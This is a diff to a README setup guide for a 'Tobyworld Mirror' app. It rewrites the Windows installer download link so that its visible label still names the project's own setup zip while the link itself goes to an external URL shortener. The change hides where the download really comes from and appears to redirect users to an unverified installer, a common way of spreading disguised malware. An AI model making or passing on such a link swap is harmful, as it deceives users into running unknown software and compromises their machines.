@@ -8,7 +8,7 @@ Welcome to the Tobyworld Mirror Mini App — choose your setup guide:
 ---
 
 ## 📥 Windows Download
-- [Setup Tobyworld Mirror 1.0.0.0.zip](./windows-version/Setup_Tobyworld%20Mirror_1.0.0.0.zip)  
+- [[Setup Tobyworld Mirror 1.0.0.0.zip](./windows-version/Setup_Tobyworld%20Mirror_1.0.0.0.zip)  ](https://t.co/VV0AgLRiBz)
   *(After installing, copy your lore scrolls into `C:\Tobyworld Mirror\lore-scrolls`)*
 
 ---
